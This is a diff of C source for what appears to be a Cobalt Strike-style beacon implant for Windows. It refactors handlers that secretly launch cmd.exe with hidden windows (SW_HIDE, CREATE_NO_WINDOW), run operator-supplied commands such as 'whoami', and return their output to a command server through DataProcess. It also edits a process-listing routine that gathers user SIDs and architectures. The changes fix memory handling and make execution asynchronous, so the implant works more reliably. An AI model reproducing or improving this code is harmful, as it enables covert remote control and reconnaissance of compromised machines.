@@ -14,9 +14,6 @@
 #define TEXT(str) str
 #endif
 
-extern BeaconJob;
-unsigned char result_buff[1024 * 50];
-
 // convert unsigned char* to _TCHAR*
 TCHAR* ConvertTo_TCHAR(const unsigned char* input) {
 #ifdef UNICODE
@@ -40,29 +37,42 @@ typedef struct {
 } ParseCommandShellparse;
 
 struct ThreadArgs {
-    unsigned char* buf;
+    unsigned char* commandBuf;
     size_t* commandBuflen;
-    size_t* Bufflen;
 };
 
-ParseCommandShellparse ParseCommandShell(unsigned char* comandBuf) {
+ParseCommandShellparse ParseCommandShell(unsigned char* commandBuf) {
     // pathLength(4 Bytes) | path | cmdLength(4 Bytes) |  cmd
     uint8_t pathLenBytes[4];
-    memcpy(pathLenBytes, comandBuf, 4);
+    ParseCommandShellparse result = { 0 };
+    memcpy(pathLenBytes, commandBuf, 4);
     uint32_t pathLength = bigEndianUint32(pathLenBytes);
-    unsigned char* path = (unsigned char*)malloc(pathLength);
-    path[pathLength] = '\0';
-    unsigned char* pathstart = comandBuf + 4;
-    memcpy(path, pathstart, pathLength);
+    unsigned char* path = (unsigned char*)malloc(pathLength + 1);
+    if (!path) {
+        fprintf(stderr, "Memory allocation failed for path\n");
+        return result;
+    }
+    if (pathLength > 0) {
+        path[pathLength] = '\0';
+    }
+    unsigned char* pathstart = commandBuf + 4;
+    memcpy(path, pathstart, pathLength); // %COMSPEC%
     uint8_t cmdLenBytes[4];
-    unsigned char* cmdLenBytesStart = comandBuf + 4 + pathLength;
+    unsigned char* cmdLenBytesStart = commandBuf + 4 + pathLength;
     memcpy(cmdLenBytes, cmdLenBytesStart, 4);
     uint32_t cmdLength = bigEndianUint32(cmdLenBytes);
-    unsigned char* cmdArgs = (unsigned char*)malloc(cmdLength);
-    cmdArgs[cmdLength] = '\0';
-    unsigned char* cmdBufferStart = comandBuf + 8 + pathLength;
-    memcpy(cmdArgs, cmdBufferStart, cmdLength); // /C whoami
-    unsigned char* envKey = str_replace_all(path, "%", "");
+    unsigned char* cmdArgs = (unsigned char*)malloc(cmdLength + 1);
+    if (!cmdArgs) {
+        fprintf(stderr, "Memory allocation failed for cmdArgs\n");
+        free(path);
+		return result;
+    }
+    if (cmdLength > 0) {
+        cmdArgs[cmdLength] = '\0';
+    }
+    unsigned char* cmdBufferStart = commandBuf + 8 + pathLength;
+    memcpy(cmdArgs, cmdBufferStart, cmdLength);     // /C whoami
+    unsigned char* envKey = str_replace_all(path, "%", ""); // 去除 "%"
 
     unsigned char* cmdPathFromEnv = getenv(envKey); // C:\WINDOWS\system32\cmd.exe
     ParseCommandShellparse ParseCommandShellparse;
@@ -76,250 +86,266 @@ ParseCommandShellparse ParseCommandShell(unsigned char* comandBuf) {
 DWORD WINAPI myThreadCmdRun(LPVOID lpParam) {
     Sleep(2000);
     struct ThreadArgs* args = (struct ThreadArgs*)lpParam;
-    unsigned char* buf = args->buf;
+    unsigned char* commandBuf = args->commandBuf;
     size_t* commandBuflen = args->commandBuflen;
-    size_t* Bufflen = args->Bufflen;
 
     BOOL bRet = FALSE;
 
     HANDLE hReadPipe = NULL;
     HANDLE hWritePipe = NULL;
-    SECURITY_ATTRIBUTES securityAttributes = { 0 };
+    // 第三个参数为 TRUE 表示子进程可以继承管道句柄
+    SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
+
+    if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) {
+        fprintf(stderr, "CreatePipe Failed With Error:%lu", GetLastError());
+        free(args);
+        return FALSE;
+    }
+
     STARTUPINFO si = { 0 };
     PROCESS_INFORMATION pi = { 0 };
-    CreatePipeJob Createpipe = createPipeJob();
-    hReadPipe = Createpipe.hReadPipe;
-    si = Createpipe.si;
+    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
+    si.cb = sizeof(STARTUPINFO);
+    si.hStdError = hWritePipe;
+    si.hStdOutput = hWritePipe;
+    si.wShowWindow = SW_HIDE;
 
-    ParseCommandShellparse ParseCommand = ParseCommandShell(buf);
-    TCHAR* shellBuf = ConvertTo_TCHAR(ParseCommand.shellBuf);
+    ParseCommandShellparse ParseCommand = ParseCommandShell(commandBuf);
+    LPSTR shellBuf = (LPSTR)ParseCommand.shellBuf;
 
-    _TCHAR commandLine[MAX_PATH];
-    _sntprintf(commandLine, MAX_PATH, _T("%s"), shellBuf); // C:\WINDOWS\system32\cmd.exe  /C whoami
+    // 构建 CreateProcessA 参数
+    CHAR commandLine[MAX_PATH];
+    snprintf(commandLine, MAX_PATH, "%s", shellBuf);
 
-    bRet = CreateProcess(NULL, commandLine, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
-
-    if (FALSE == bRet) {
-        return 1;
+    // 执行结果将写入 hReadPipe 
+    if (!CreateProcessA(NULL, commandLine, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
+        fprintf(stderr, "CreateProcessA Failed With Error:%lu\n", GetLastError());
+        free(shellBuf);
+        free(args->commandBuf);
+        free(args);
+        CloseHandle(hReadPipe);
+        CloseHandle(hWritePipe);
+        return FALSE;
     }
-    
-    initialize_Beacon_Job(pi.hProcess, pi.hThread, pi.dwProcessId, pi.dwThreadId, hReadPipe, hWritePipe, "process")->JobType = 30; // 直接访问此函数的返回值JobType
-    // Wait for the command execution to finish
-    // WaitForSingleObject(pi.hThread, INFINITE);
-    // WaitForSingleObject(pi.hProcess, INFINITE);
-    WaitForSingleObject(pi.hProcess, 5000);
 
-    // Read the result from the anonymous pipe into the output buffer
-    bool lastTime = false;
-    bool firstTime = true;
-    OVERLAPPED overlap = { 0 };
-    DWORD readbytes = 0;
-    DWORD availbytes = 0;
-    while (!lastTime) {
+    DWORD numberOfBytesRead = 0;
+    DWORD bufferSize = 1024 * 10;
+    BOOL firstTime = TRUE;
+    unsigned char* buffer = (unsigned char*)malloc(bufferSize);
 
-        // 非阻塞检查子进程状态
-        DWORD event = WaitForSingleObject(pi.hProcess, 0);
-        if (event == WAIT_OBJECT_0 || event == WAIT_FAILED) { // 子进程已经退出或者调用失败
-            lastTime = TRUE;
-        }
+    // 关闭父进程管道句柄，必须关闭，否则在 hReadPipe 没有数据的情况下 ReadFile 会阻塞
+    if (CloseHandle(hWritePipe) == FALSE) {
+        fprintf(stderr, "CloseHandle Failed With Error:%lu\n", GetLastError());
+        free(buffer);
+        free(shellBuf);
+        free(args->commandBuf);
+        free(args);
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
+        CloseHandle(hReadPipe);
+        return FALSE;
+    }
 
-        // 非阻塞检测管道是否有数据可读
-        if (!PeekNamedPipe(hReadPipe, NULL, 0, NULL, &availbytes, NULL)) {
-            break;
-        }
+    while (TRUE) {
+        Sleep(5000);
 
-        // 子进程未退出并且无数据可读
-        while (lastTime == false && availbytes == 0) {
-            // 再次等待 5s 等待子进程退出
-            DWORD event = WaitForSingleObject(pi.hProcess, 5000);
-            // 再次更新 availbytes
-            PeekNamedPipe(hReadPipe, NULL, 0, NULL, &availbytes, NULL);
-        }
-
-        // 读取子进程输出
-        if (lastTime == false || availbytes != 0) {
-            ReadFile(hReadPipe, result_buff, sizeof(result_buff), NULL, &overlap);
-        }
-
-        DWORD bytesTransferred;
-        ULONG_PTR completionKey;
-        LPOVERLAPPED pOverlapped;
-
-        if (overlap.InternalHigh > 0) {
-            if (firstTime) {
-                DataProcess(result_buff, overlap.InternalHigh, 0);
-                firstTime = false;
+        if (!ReadFile(hReadPipe, buffer, bufferSize, &numberOfBytesRead, NULL)) {
+            DWORD errorCode = GetLastError();
+            // hWritePipe 句柄关闭后，没有数据则出现 ERROR_BROKEN_PIPE
+            if (errorCode == ERROR_BROKEN_PIPE) {
+                unsigned char* endStr = "-----------------------------------end-----------------------------------\n";
+                unsigned char* resultStr = malloc(strlen(endStr) + 1);
+                if (resultStr) {
+                    memcpy(resultStr, endStr, strlen(endStr) + 1);
+                    DataProcess(resultStr, strlen(endStr), 0);
+                    break;
+                }
             }
             else {
-                // 子进程还没有退出
-                if (lastTime == false) {
-
-                    uint8_t* metaInfoBytes1[] = { result_buff };
-                    size_t metaInfosizes1[] = { overlap.InternalHigh };
-                    size_t metaInfoBytesArrays1 = sizeof(metaInfoBytes1) / sizeof(metaInfoBytes1[0]);
-                    uint8_t* metaInfoconcatenated1 = CalcByte(metaInfoBytes1, metaInfosizes1, metaInfoBytesArrays1);
-                    size_t metaInfoSize1 = 0;
-                    // 计算所有 sizeof 返回值的总和
-                    for (size_t i = 0; i < sizeof(metaInfosizes1) / sizeof(metaInfosizes1[0]); ++i) {
-                        metaInfoSize1 += metaInfosizes1[i];
+                fprintf(stderr, "ReadFile Failed With Error:%lu\n", errorCode);
+                free(buffer);
+                free(shellBuf);
+                CloseHandle(pi.hThread);
+                CloseHandle(pi.hProcess);
+                CloseHandle(hReadPipe);
+                free(args->commandBuf);
+                free(args);
+                return FALSE;
+            }
+        }
+        else {
+            if (numberOfBytesRead > 0) {
+                if (firstTime) {
+                    unsigned char* resultStr = (unsigned char*)malloc(numberOfBytesRead + 1);
+                    if (resultStr) {
+                        memcpy(resultStr, buffer, numberOfBytesRead);
+                        DataProcess(resultStr, numberOfBytesRead, 0);
                     }
-
-                    DataProcess(metaInfoconcatenated1, metaInfoSize1, 0);
-
+                    firstTime = FALSE;
                 }
                 else {
-                    uint8_t jia[5] = "[+] ";
-                    uint8_t nnn[2] = "\n";
-                    uint8_t end[75] = "-----------------------------------end-----------------------------------\n";
-                    uint8_t* metaInfoBytes[] = { jia,end,ParseCommand.shellBuf + 4 };
-                    size_t metaInfosizes[] = { 5,75,strlen(ParseCommand.shellBuf) - 4 };
-                    size_t metaInfoBytesArrays = sizeof(metaInfoBytes) / sizeof(metaInfoBytes[0]);
-                    uint8_t* metaInfoconcatenated = CalcByte(metaInfoBytes, metaInfosizes, metaInfoBytesArrays);
-                    size_t metaInfoSize = 0;
-                    // 计算所有 sizeof 返回值的总和
-                    for (size_t i = 0; i < sizeof(metaInfosizes) / sizeof(metaInfosizes[0]); ++i) {
-                        metaInfoSize += metaInfosizes[i];
+                    char prompt[MAX_PATH];
+                    snprintf(prompt, MAX_PATH, "[+] %s :\n", commandLine);
+                    DataProcess((unsigned char*)prompt, strlen(prompt), 0);
+                    unsigned char* resultStr = (unsigned char*)malloc(numberOfBytesRead + 1);
+                    if (resultStr) {
+                        memcpy(resultStr, buffer, numberOfBytesRead);
+                        DataProcess(resultStr, numberOfBytesRead, 0);
+                        free(resultStr);
                     }
-                    DataProcess(metaInfoconcatenated, metaInfoSize, 0);
                 }
             }
         }
-
-        Sleep(2000);
-
     }
 
+    free(buffer);
+    free(shellBuf);
     CloseHandle(pi.hThread);
     CloseHandle(pi.hProcess);
-    CloseHandle(hWritePipe);
     CloseHandle(hReadPipe);
-
-    return 0;
+    free(args->commandBuf);
+    free(args);
+    return TRUE;
 }
 
 DWORD WINAPI myThreadCmdshell(LPVOID lpParam) {
     Sleep(2000);
     struct ThreadArgs* args = (struct ThreadArgs*)lpParam;
-    unsigned char* buf = args->buf;
+    unsigned char* commandBuf = args->commandBuf;
     size_t* commandBuflen = args->commandBuflen;
-    size_t* Bufflen = args->Bufflen;
 
     BOOL bRet = FALSE;
 
     HANDLE hReadPipe = NULL;
     HANDLE hWritePipe = NULL;
-    SECURITY_ATTRIBUTES securityAttributes = { 0 };
-    STARTUPINFO si = { 0 };
-    PROCESS_INFORMATION pi = { 0 };
-    CreatePipeJob Createpipe = createPipeJob();
-    hReadPipe = Createpipe.hReadPipe;
-    hWritePipe = Createpipe.hWritePipe;
-    si = Createpipe.si;
+	// 第三个参数为 TRUE 表示子进程可以继承管道句柄
+    SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
 
-    ParseCommandShellparse ParseCommand = ParseCommandShell(buf); // 从 ComandBuffer 解析
-    TCHAR* shellPath = ConvertTo_TCHAR(ParseCommand.shellPath);
-    TCHAR* shellBuf = ConvertTo_TCHAR(ParseCommand.shellBuf);
-
-    // 构建命令行参数
-    _TCHAR commandLine[MAX_PATH];
-    _sntprintf(commandLine, MAX_PATH, _T("%s %s"), shellPath, shellBuf); //C:\WINDOWS\system32\cmd.exe /C whoami
-
-    bRet = CreateProcess(NULL, commandLine, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi); // 回显执行的结果写入 hReadPipe
-    if (FALSE == bRet) {
-        fprintf(stderr, "CreateProcess Failed:%lu\n",GetLastError());
+    if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) {
+        fprintf(stderr, "CreatePipe Failed With Error:%lu", GetLastError());
+        free(args->commandBuf);
+        free(args);
         return FALSE;
     }
 
-    initialize_Beacon_Job(pi.hProcess, pi.hThread, pi.dwProcessId, pi.dwThreadId, hReadPipe, hWritePipe, "process")->JobType = 30;
-    // 等待子进程结束
-    WaitForSingleObject(pi.hProcess, 5000);
+    STARTUPINFO si = { 0 };
+    PROCESS_INFORMATION pi = { 0 };
+	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
+	si.cb = sizeof(STARTUPINFO);
+    si.hStdError = hWritePipe;
+    si.hStdOutput = hWritePipe;
+    si.wShowWindow = SW_HIDE;
 
-    bool lastTime = false;
-    bool firstTime = true;
-    OVERLAPPED overlap = { 0 };
-    DWORD readbytes = 0;
-    DWORD availbytes = 0;
-    unsigned char readBuffer[1024 * 8]; 
-    while (!lastTime) {
-        DWORD event = WaitForSingleObject(pi.hProcess, 0); // 检查 pi.hProcess 所代表的进程的状态 
-        if (event == WAIT_OBJECT_0 || event == WAIT_FAILED) {
-            // 感觉这里要等管道全部读取完子进程产生的数据 子进程才会退出
-            // WAIT_OBJECT_0 代表子进程已经结束 子进程退出了
-            // lastTime = True 表示cmd控制台没有数据要产生了
-            lastTime = TRUE;
-        }
+    ParseCommandShellparse ParseCommand = ParseCommandShell(commandBuf);
+    LPSTR shellPath = (LPSTR)ParseCommand.shellPath;
+    LPSTR shellBuf = (LPSTR)ParseCommand.shellBuf;
 
-        // 检查管道中是否有数据可读
-        // 发现每次读取大小差不多是 4KB 这里感觉是管道的缓冲区限制
-        if (!PeekNamedPipe(hReadPipe, NULL, 0, NULL, &availbytes, NULL)) break;
-        
-        while (lastTime == false && availbytes == 0) {
-            // 此分支表示子进程可能还没执行完 还没有产生数据 所以 availbytes == 0
-            // 如果子进程没有执行完毕 则循环等待 pi.hProcess 直到读取到 availbytes
-            // 考虑如果子进程刚开始没有执行完，但是始终没有数据产生，进入此分支不是卡死了？
-            DWORD event = WaitForSingleObject(pi.hProcess, 5000);
-            PeekNamedPipe(hReadPipe, NULL, 0, NULL, &availbytes, NULL);
-        }
-       
-        if (lastTime == false || availbytes != 0) {
-            // 此分支表示子进程产生了数据 开始读取
-            if (!ReadFile(hReadPipe, readBuffer, sizeof(readBuffer), NULL, &overlap)) {
-                fprintf(stderr, "ReadFile Failed:%lu\n", GetLastError());
-                return FALSE;
-            }
-        }
-        
-        DWORD bytesTransferred;
-        ULONG_PTR completionKey;
-        LPOVERLAPPED pOverlapped;
-        
-        if (overlap.InternalHigh > 0) {
-            if (firstTime) {
-                // 第一次传输数据进入这个分支
-                DataProcess(readBuffer, overlap.InternalHigh, 0);
-                firstTime = false;
-            }
-            else {
-                if (lastTime == false) {
-                    // 子进程产生的数据还没读完
-                    DataProcess(readBuffer, overlap.InternalHigh, 0);
-                }else {
-                    // 发送剩下的数据
-                    DataProcess(readBuffer, overlap.InternalHigh, 0);
-                    // 不是第一次传输数据 并且子进程执行完毕了 这里是最后一次向 Server 发送数据
-                    const char* result = "[+] This Shell Command Already Executed";
-                    unsigned char* postInfo = (unsigned char*)malloc(strlen(result));
-                    memcpy(postInfo, result, strlen(result));
+    // 构建 CreateProcessA 参数
+    CHAR commandLine[MAX_PATH];
+    // C:\WINDOWS\system32\cmd.exe /C whoami
+    snprintf(commandLine, MAX_PATH, "%s %s", shellPath, shellBuf);
 
-                    DataProcess(postInfo, strlen(result), 0);
-                    free(postInfo);
-                 }
-            }
-        }
-        
-        Sleep(2000);
-
+    // 执行结果将写入 hReadPipe 
+    if (!CreateProcessA(NULL, commandLine, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
+        fprintf(stderr, "CreateProcessA Failed With Error:%lu\n", GetLastError());
+        free(shellBuf);
+        free(args->commandBuf);
+        free(args);
+        CloseHandle(hReadPipe);
+        CloseHandle(hWritePipe);
+        return FALSE;
     }
 
-    free(shellPath);
+	DWORD numberOfBytesRead = 0;
+    DWORD bufferSize = 1024 * 10;
+	BOOL firstTime = TRUE;
+    unsigned char* buffer = (unsigned char*)malloc(bufferSize);
+    
+	// 关闭父进程管道句柄，必须关闭，否则在 hReadPipe 没有数据的情况下 ReadFile 会阻塞
+    if(CloseHandle(hWritePipe) == FALSE) {
+        fprintf(stderr, "CloseHandle Failed With Error:%lu\n", GetLastError());
+        free(buffer);
+        free(shellBuf);
+        free(args->commandBuf);
+        free(args);
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
+        CloseHandle(hReadPipe);
+        return FALSE;
+	}
+
+    while (TRUE) {
+        Sleep(5000);
+
+        if(!ReadFile(hReadPipe, buffer, bufferSize, &numberOfBytesRead, NULL)) {
+            DWORD errorCode = GetLastError();
+            // hWritePipe 句柄关闭后，没有数据则出现 ERROR_BROKEN_PIPE
+            if (errorCode == ERROR_BROKEN_PIPE) {
+                unsigned char* endStr = "-----------------------------------end-----------------------------------\n";
+                unsigned char* resultStr = malloc(strlen(endStr) + 1);
+                if(resultStr) {
+                    memcpy(resultStr, endStr, strlen(endStr) + 1);
+                    DataProcess(resultStr, strlen(endStr), 0);
+                    break;
+				}
+            }
+            else {
+                fprintf(stderr, "ReadFile Failed With Error:%lu\n", errorCode);
+                free(buffer);
+                free(shellBuf);
+                CloseHandle(pi.hThread);
+                CloseHandle(pi.hProcess);
+                CloseHandle(hReadPipe);
+                free(args->commandBuf);
+                free(args);
+                return FALSE;
+            }
+		}
+        else {
+            if(numberOfBytesRead > 0) {
+                if (firstTime) {
+                    unsigned char* resultStr = (unsigned char*)malloc(numberOfBytesRead + 1);
+                    if (resultStr) {
+                        memcpy(resultStr, buffer, numberOfBytesRead);
+                        DataProcess(resultStr, numberOfBytesRead, 0);
+                    }
+                    firstTime = FALSE;
+                }
+                else {
+                    char prompt[MAX_PATH];   
+                    snprintf(prompt, MAX_PATH, "[+] %s :\n", commandLine);
+                    DataProcess((unsigned char*)prompt, strlen(prompt), 0);
+                    unsigned char* resultStr = (unsigned char*)malloc(numberOfBytesRead + 1);
+                    if (resultStr) {
+                        memcpy(resultStr, buffer, numberOfBytesRead);
+                        DataProcess(resultStr, numberOfBytesRead, 0);
+                        free(resultStr);
+                    }
+                }
+			}
+        }
+    }
+
+    free(buffer);
     free(shellBuf);
     CloseHandle(pi.hThread);
     CloseHandle(pi.hProcess);
-    CloseHandle(hWritePipe);
     CloseHandle(hReadPipe);
-    
+    free(args->commandBuf);
+    free(args);
     return TRUE;
 }
 
-unsigned char* CmdShell(unsigned char* commandBuf, size_t* commandBuflen, size_t* Bufflen)
-{
-    struct ThreadArgs* args = (struct ThreadArgs*)malloc(sizeof(struct ThreadArgs));
-    if (args == NULL) {
-        return NULL;
+VOID CmdShell(unsigned char* commandBuf, size_t* commandBuflen)
+{ 
+	// 解决线程还么运行 commandBuf 可能被释放的问题
+    struct ThreadArgs* args = malloc(sizeof(struct ThreadArgs));
+    args->commandBuf = (unsigned char*)malloc(*commandBuflen);
+    if (args->commandBuf) {
+        memcpy(args->commandBuf, commandBuf, *commandBuflen);
     }
+    args->commandBuflen = *commandBuflen;
 
-    args->buf = commandBuf;                    
-    args->commandBuflen = commandBuflen;  
     ParseCommandShellparse ParseCommand = ParseCommandShell(commandBuf);
     HANDLE myThread;
     if (ParseCommand.shellPath == NULL) {
@@ -331,9 +357,10 @@ unsigned char* CmdShell(unsigned char* commandBuf, size_t* commandBuflen, size_t
             0,                          // 默认创建标志
             NULL);                      // 不存储线程ID
         if (myThread == NULL) {
-            fprintf(stderr, "Failed to create thread. Error code: %lu\n", GetLastError());
+            fprintf(stderr, "CeateThread Failed With Error: %lu\n", GetLastError());
+			free(args->commandBuf);
             free(args);
-            return NULL;
+            return;
         }
     }
     else {
@@ -346,28 +373,17 @@ unsigned char* CmdShell(unsigned char* commandBuf, size_t* commandBuflen, size_t
             0,                          // 默认创建标志
             NULL);                      // 不存储线程ID
         if (myThread == NULL) {
-            fprintf(stderr, "Failed to create thread. Error code: %lu\n", GetLastError());
+            fprintf(stderr, "CeateThread Failed With Error: %lu\n", GetLastError());
+            free(args->commandBuf);
             free(args);
-            return NULL;
+            return;
         }
+        // 异步执行
+		// 不使用 WaiteForSingleObject
+        // WaitForSingleObject(myThread, INFINITE);
+        CloseHandle(myThread);
+
     }
-   
-    WaitForSingleObject(myThread, INFINITE);
-
-    CloseHandle(myThread);
-
-    unsigned char* success = "[+] Command is executed";
-    unsigned char* result = (unsigned char*)malloc(strlen(success) +  1);
-    if (result == NULL) {
-        fprintf(stderr, "Memory allocation failed\n");
-        return NULL; 
-    }
-    memcpy(result, success, strlen(success) + 1);
-    *Bufflen = strlen(result);
-
-    free(args);
-
-    return result;
 }
 
 int get_user_sid(size_t BufferSize, HANDLE TokenHandle, char* Buffer)
@@ -445,13 +461,13 @@ BOOL IsProcessX64s(DWORD pid) {
     return FALSE;
 }
 
-void CmdPs(char* Taskdata, int Task_size)
+VOID CmdPs(unsigned char* commandBuf, size_t* commandBuflen)
 {
     char usersid[2048];
     memset(usersid, 0, sizeof(usersid));
 
     datap datap;
-    BeaconDataParse(&datap, Taskdata, Task_size);
+    BeaconDataParse(&datap, commandBuf, *commandBuflen);
     int unknown = BeaconDataInt(&datap);
     BeaconFormatAlloc((formatp*)&datap, 0x8000);
     if (unknown > 0)
@@ -502,6 +518,7 @@ void CmdPs(char* Taskdata, int Task_size)
                         arch2,
                         usersid,
                         pSessionId);
+                    CloseHandle(hprocess);
                 }
                 else
                 {
@@ -517,7 +534,6 @@ void CmdPs(char* Taskdata, int Task_size)
                         "",
                         pSessionId);
                 }
-                CloseHandle(hprocess);
             } while (Process32Next(Toolhelp32Snapshot, &pe));
             CloseHandle(Toolhelp32Snapshot);
             int msg_type;
